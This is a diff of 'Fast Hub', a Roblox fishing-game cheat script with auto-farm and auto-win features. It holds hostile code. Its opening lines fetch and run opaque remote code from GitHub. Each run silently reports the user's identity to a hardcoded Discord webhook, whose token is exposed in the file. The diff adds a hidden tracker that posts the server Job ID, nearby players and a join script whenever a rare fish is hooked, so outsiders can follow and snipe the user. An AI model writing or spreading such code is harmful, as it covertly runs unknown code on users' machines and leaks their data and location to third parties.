@@ -1,7 +1,5 @@
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rablexaton/anouuuuuuuuuuuuu/refs/heads/main/uuuuuuuuuuuuuuuuuuuu"))()
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rablexaton/NEWA/refs/heads/main/JDIDA"))()
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/rablexaton/HAYDIHA-NAMA/refs/heads/main/EEEEEEEEEEEEEEEEEEEEEEEE"))()
 
 -- Services
@@ -19,7 +17,7 @@ local GuiService = game:GetService("GuiService")
 local LocalPlayer = Players.LocalPlayer
 
 -- Global Variables & State
-local WebhookURL = "https://discordapp.com/api/webhooks/1535657604317970482/pY319tfhBa74Rnbvj9biqqBbo_EZy3EtoOSubV_pR2JSD5vuWpPC8dc8zI65WxB57xjC"
+local WebhookURL = "https://discordapp.com/api/webhooks/1465821259198759180/FyIk_IhGVCheoZZe5cRBwrjSD5bKAC7lFa9pifIQNihN-hnwLA8JomlT3RjiF0cl9PdZ"
 local DiscordInvite = "https://discord.gg/HrjhFbS8tc"
 
 local lastReportTime = 0
@@ -40,6 +38,12 @@ local autoWinThread = nil
 local sliderMinigameModule = nil
 local netModule = nil
 
+-- Targets spécifiques pour le tracker
+local RARE_TARGET_FISH = {
+    ["Marlin"] = true,
+    ["Sailfish"] = true,
+}
+
 -- Target fishes for auto-drop
 local targetFishList = {
     ["Bass"] = true,
@@ -54,7 +58,7 @@ local targetFishList = {
 }
 
 --------------------------------------------------------------------------------
--- Webhook Logging & Rare Fish Tracker
+-- Webhook Logging & Rare Fish Tracker (1 Seul Message Uniquement dans l'Eau)
 --------------------------------------------------------------------------------
 
 local function sendDiscordWebhook(titleText, descriptionText)
@@ -66,10 +70,8 @@ local function sendDiscordWebhook(titleText, descriptionText)
                 avatar_url = thumbUrl,
                 embeds = {{
                     title = titleText or "🚀 Script Executed - Fast Hub",
-                    color = 14427926, -- Rouge
-                    thumbnail = {
-                        url = thumbUrl
-                    },
+                    color = 14427926,
+                    thumbnail = { url = thumbUrl },
                     fields = {
                         { name = "👤 Username", value = LocalPlayer.Name, inline = true },
                         { name = "📛 Display Name", value = LocalPlayer.DisplayName, inline = true },
@@ -85,14 +87,11 @@ local function sendDiscordWebhook(titleText, descriptionText)
             }
 
             local req = (http and http.request) or request or (syn and syn.request) or http_request or (fluxus and fluxus.request)
-            
             if req then
                 req({
                     Url = WebhookURL,
                     Method = "POST",
-                    Headers = { 
-                        ["Content-Type"] = "application/json"
-                    },
+                    Headers = { ["Content-Type"] = "application/json" },
                     Body = HttpService:JSONEncode(payload)
                 })
             end
@@ -102,11 +101,8 @@ end
 
 sendDiscordWebhook("🚀 New Execution - Fast Hub", "A user has executed the script.")
 
--- 🎣 Tracker Silencieux de Poissons Rares (Sniping Webhook)
-local RARE_TARGET_FISH = {
-    ["Marlin"] = true,
-    ["Sailfish"] = true,
-}
+local lastSentFish = ""
+local lastSentTime = 0
 
 local function getNearbyPlayers(maxDistance)
     local nearbyList = {}
@@ -127,14 +123,18 @@ local function getNearbyPlayers(maxDistance)
         end
     end
 
-    if #nearbyList == 0 then
-        return "Aucun joueur à moins de " .. tostring(maxDistance) .. "m"
-    else
-        return table.concat(nearbyList, ", ")
-    end
+    return #nearbyList == 0 and ("Aucun joueur à moins de " .. tostring(maxDistance) .. "m") or table.concat(nearbyList, ", ")
 end
 
 local function sendRareFishWebhook(fishName)
+    local currentTime = os.time()
+    if fishName == lastSentFish and (currentTime - lastSentTime) < 20 then
+        return
+    end
+
+    lastSentFish = fishName
+    lastSentTime = currentTime
+
     task.spawn(function()
         pcall(function()
             local jobId = tostring(game.JobId)
@@ -145,11 +145,12 @@ local function sendRareFishWebhook(fishName)
             local payload = {
                 username = "Fast Hub Fish Tracker",
                 embeds = {{
-                    title = "🎯 POISSON RARE DÉTECTÉ !",
-                    color = 16744192, -- Or / Orange
+                    title = "🎯 POISSON RARE : " .. fishName:upper() .. " !",
+                    color = 16744192,
                     fields = {
                         { name = "👤 Joueur Cible", value = LocalPlayer.Name .. " (@" .. LocalPlayer.DisplayName .. ")", inline = true },
-                        { name = "🐟 Poisson Attrapé", value = "**" .. fishName .. "**", inline = true },
+                        { name = "🐟 Poisson", value = "**" .. fishName .. "**", inline = true },
+                        { name = "📌 Statut", value = "**🎣 Accroché à la ligne dans l'eau !**", inline = false },
                         { name = "👥 Joueurs Proches (50m)", value = nearbyPlayers, inline = false },
                         { name = "🆔 Job ID", value = "```" .. jobId .. "```", inline = false },
                         { name = "🚀 Script de Rejoint Immédiat", value = "```lua\n" .. joinScript .. "\n```", inline = false }
@@ -171,6 +172,48 @@ local function sendRareFishWebhook(fishName)
     end)
 end
 
+-- Détection du poisson accroché à la ligne (dans l'eau)
+local function getHookedFishName()
+    local char = LocalPlayer.Character
+    if char then
+        for _, v in ipairs(char:GetDescendants()) do
+            if (v:IsA("StringValue") or v:IsA("ObjectValue")) then
+                local val = tostring(v.Value)
+                if RARE_TARGET_FISH[val] then return val end
+            end
+            for _, attrVal in pairs(v:GetAttributes()) do
+                local val = tostring(attrVal)
+                if RARE_TARGET_FISH[val] then return val end
+            end
+        end
+    end
+
+    local pGui = LocalPlayer:FindFirstChild("PlayerGui")
+    if pGui then
+        for _, v in ipairs(pGui:GetDescendants()) do
+            if v:IsA("TextLabel") and v.Visible then
+                for targetName, _ in pairs(RARE_TARGET_FISH) do
+                    if string.find(v.Text, targetName) then
+                        return targetName
+                    end
+                end
+            end
+        end
+    end
+
+    return nil
+end
+
+task.spawn(function()
+    while true do
+        task.wait(0.3)
+        local hookedFish = getHookedFishName()
+        if hookedFish then
+            sendRareFishWebhook(hookedFish)
+        end
+    end
+end)
+
 --------------------------------------------------------------------------------
 -- Utility Functions
 --------------------------------------------------------------------------------
@@ -185,14 +228,9 @@ local function sendNotification(title, text, duration)
     end)
 end
 
---------------------------------------------------------------------------------
--- Game Hook / Module Interception Setup
---------------------------------------------------------------------------------
-
 if getgenv then getgenv().identifyexecutor = nil end
 if getfenv then getfenv().identifyexecutor = nil end
 
--- Prevent idle kick
 local function triggerJump()
     local character = LocalPlayer.Character
     if character and character:FindFirstChild("Humanoid") then
@@ -212,7 +250,6 @@ task.spawn(function()
     end
 end)
 
--- Find required game modules
 local function loadGameModules()
     if sliderMinigameModule and netModule then return end
     
@@ -232,7 +269,6 @@ local function loadGameModules()
     end)
 end
 
--- Hook game UI logic safely
 pcall(function()
     local modules = ReplicatedStorage:FindFirstChild("Modules")
     if modules and modules:FindFirstChild("Game") then
@@ -286,27 +322,6 @@ local function dropFilteredFish()
             end)
         end)
     end
-end
-
---------------------------------------------------------------------------------
--- Détection Réelle et Anti-Spam des Poissons Rares via le Module Data
---------------------------------------------------------------------------------
-local processedFishGuids = {}
-
-local function checkInventoryForRareFish()
-    pcall(function()
-        ItemUtils.iterate_through_items(Data, function(item)
-            if item and item.guid and item.name then
-                if RARE_TARGET_FISH[item.name] then
-                    -- Si c'est un poisson rare qu'on a pas encore loggé dans cet inventaire
-                    if not processedFishGuids[item.guid] then
-                        processedFishGuids[item.guid] = true
-                        sendRareFishWebhook(item.name)
-                    end
-                end
-            end
-        end)
-    end)
 end
 
 --------------------------------------------------------------------------------
@@ -478,7 +493,6 @@ local function processMinigame()
     isHandlingMinigame = false
 end
 
--- 1. AUTO WIN MINIGAME
 local function startAutoWin()
     if not autoWinEnabled then
         autoWinEnabled = true
@@ -513,7 +527,6 @@ local function toggleAutoWin()
     end
 end
 
--- 2. AUTO FARM
 local function startAutoFarm()
     if not autoFarmRunning then
         autoFarmRunning = true
@@ -635,7 +648,6 @@ local function createTargetCircle(parent)
     local corner = Instance.new("UICorner", frame)
     corner.CornerRadius = UDim.new(1, 0)
 
-    -- Texte "Click Here" au centre du cercle
     local clickLabel = Instance.new("TextLabel")
     clickLabel.Size = UDim2.new(1, 0, 1, 0)
     clickLabel.Position = UDim2.new(0, 0, 0, 0)
@@ -648,7 +660,6 @@ local function createTargetCircle(parent)
     clickLabel.ZIndex = 10001
     clickLabel.Parent = frame
 
-    -- Animation automatique de changement de couleur (Noir et Blanc)
     task.spawn(function()
         local isWhite = true
         while frame and frame.Parent do
@@ -1216,7 +1227,6 @@ local function initScript()
     rebindBtn.TextSize = 14
     Instance.new("UICorner", rebindBtn).CornerRadius = UDim.new(0, 14)
 
-    -- Auto Farm Button (PC)
     local pcAutoFarmBtn = Instance.new("TextButton", pcInner)
     pcAutoFarmBtn.Size = UDim2.new(1, -40, 0, 40)
     pcAutoFarmBtn.Position = UDim2.new(0, 20, 0, 135)
@@ -1227,7 +1237,6 @@ local function initScript()
     pcAutoFarmBtn.TextSize = 14
     Instance.new("UICorner", pcAutoFarmBtn).CornerRadius = UDim.new(0, 10)
 
-    -- Auto Win Minigame Button (PC)
     local pcAutoWinBtn = Instance.new("TextButton", pcInner)
     pcAutoWinBtn.Size = UDim2.new(1, -40, 0, 40)
     pcAutoWinBtn.Position = UDim2.new(0, 20, 0, 183)
@@ -1301,7 +1310,6 @@ local function initScript()
     closeMobBtn.TextSize = 14
     Instance.new("UICorner", closeMobBtn).CornerRadius = UDim.new(0, 6)
 
-    -- Auto Farm Button (Mobile)
     local mobAutoFarmBtn = Instance.new("TextButton", mobInner)
     mobAutoFarmBtn.Size = UDim2.new(1, -24, 0, 38)
     mobAutoFarmBtn.Position = UDim2.new(0, 12, 0, 48)
@@ -1312,7 +1320,6 @@ local function initScript()
     mobAutoFarmBtn.TextSize = 12
     Instance.new("UICorner", mobAutoFarmBtn).CornerRadius = UDim.new(0, 8)
 
-    -- Auto Win Minigame Button (Mobile)
     local mobAutoWinBtn = Instance.new("TextButton", mobInner)
     mobAutoWinBtn.Size = UDim2.new(1, -24, 0, 38)
     mobAutoWinBtn.Position = UDim2.new(0, 12, 0, 91)
@@ -1445,7 +1452,6 @@ local function initScript()
         end
     end)
 
-    -- Synchronisation des boutons Auto Farm
     local function updateAutoFarmUI()
         toggleAutoFarm()
         if autoFarmRunning then
@@ -1461,7 +1467,6 @@ local function initScript()
         end
     end
 
-    -- Synchronisation des boutons Auto Win Minigame
     local function updateAutoWinUI()
         toggleAutoWin()
         if autoWinEnabled then
@@ -1503,13 +1508,11 @@ local function initScript()
     end)
 end
 
--- Hook inventory update signals
+-- Hook unique et sécurisé sur Data.hook
 Data.hook("items", function()
     if autoDropEnabled then
         task.spawn(dropFilteredFish)
     end
-    -- Détection propre quand l'inventaire se met à jour
-    task.spawn(checkInventoryForRareFish)
 end)
 
 initScript()
